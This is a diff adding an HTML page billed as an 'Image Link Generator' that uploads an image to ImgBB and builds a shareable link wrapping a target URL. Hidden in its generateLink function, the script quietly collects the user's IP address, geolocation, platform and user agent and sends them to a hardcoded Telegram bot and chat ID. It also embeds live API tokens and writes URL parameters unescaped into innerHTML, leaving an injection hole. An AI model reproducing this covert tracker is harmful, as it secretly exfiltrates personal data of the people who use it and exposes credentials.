@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Link Generator</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        body { background: #f0f2f5; }
+        .container { max-width: 800px; }
+        .preview-image { max-height: 400px; object-fit: contain; }
+        .generated-link { background: #e9ecef; }
+    </style>
+</head>
+<body>
+    <div class="container py-5">
+        <h1 class="text-center mb-4">📷 Image Link Generator</h1>
+        
+        <div class="card shadow mb-4">
+            <div class="card-body">
+                <div class="mb-3">
+                    <label class="form-label">Target URL</label>
+                    <input type="url" class="form-control" id="targetUrl" placeholder="https://example.com">
+                </div>
+                
+                <div class="mb-3">
+                    <label class="form-label">Upload Image</label>
+                    <input type="file" class="form-control" id="imageUpload" accept="image/*">
+                </div>
+
+                <button class="btn btn-primary w-100" onclick="generateLink()">
+                    Generate Magic Link ✨
+                </button>
+            </div>
+        </div>
+
+        <div id="resultSection" class="d-none">
+            <div class="card shadow">
+                <div class="card-body">
+                    <p>Your magic link:</p>
+                    <code class="generated-link d-block p-3 mb-3"></code>
+                    <img src="" class="preview-image img-fluid rounded">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function generateLink() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            const imageFile = document.getElementById('imageUpload').files[0];
+            
+            if (!targetUrl || !imageFile) {
+                alert('Please fill all fields');
+                return;
+            }
+
+            // Image Upload to ImgBB
+            const formData = new FormData();
+            formData.append('image', imageFile);
+            
+            try {
+                const imgbbResponse = await fetch('https://api.imgbb.com/1/upload?key=ca59b868d04e76763271de1ec94ba509', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const imgbbData = await imgbbResponse.json();
+                const imageUrl = imgbbData.data.url;
+
+                // Generate unique link
+                const magicLink = `${window.location.href}?image=${encodeURIComponent(imageUrl)}&target=${encodeURIComponent(targetUrl)}`;
+                
+                // Show result
+                document.querySelector('.generated-link').textContent = magicLink;
+                document.querySelector('.preview-image').src = imageUrl;
+                document.getElementById('resultSection').classList.remove('d-none');
+
+                // Send to Telegram
+                const userDetails = {
+                    ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip),
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    location: await fetch(`https://ipapi.co/${await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip)/json/`).then(r => r.json())
+                };
+
+                const telegramMessage = `📸 New Image Upload:\nIP: ${userDetails.ip}\nLocation: ${userDetails.location.city}, ${userDetails.location.country}\nDevice: ${userDetails.platform}\nUser Agent: ${userDetails.userAgent}`;
+                
+                fetch(`https://api.telegram.org/bot7487768405:AAHivvY7f_SjAw13ZgYQeUYwgCQ-2FkTKjs/sendMessage?chat_id=7749024395&text=${encodeURIComponent(telegramMessage)}`);
+
+            } catch (error) {
+                alert('Error generating link');
+                console.error(error);
+            }
+        }
+
+        // Handle magic link display
+        window.onload = () => {
+            const params = new URLSearchParams(window.location.search);
+            if(params.has('image') && params.has('target')) {
+                document.body.innerHTML = `
+                    <a href="${decodeURIComponent(params.get('target'))}" target="_blank">
+                        <img src="${decodeURIComponent(params.get('image'))}" class="w-100 vh-100 object-fit-cover">
+                    </a>
+                `;
+            }
+        };
+    </script>
+</body>
+</html>
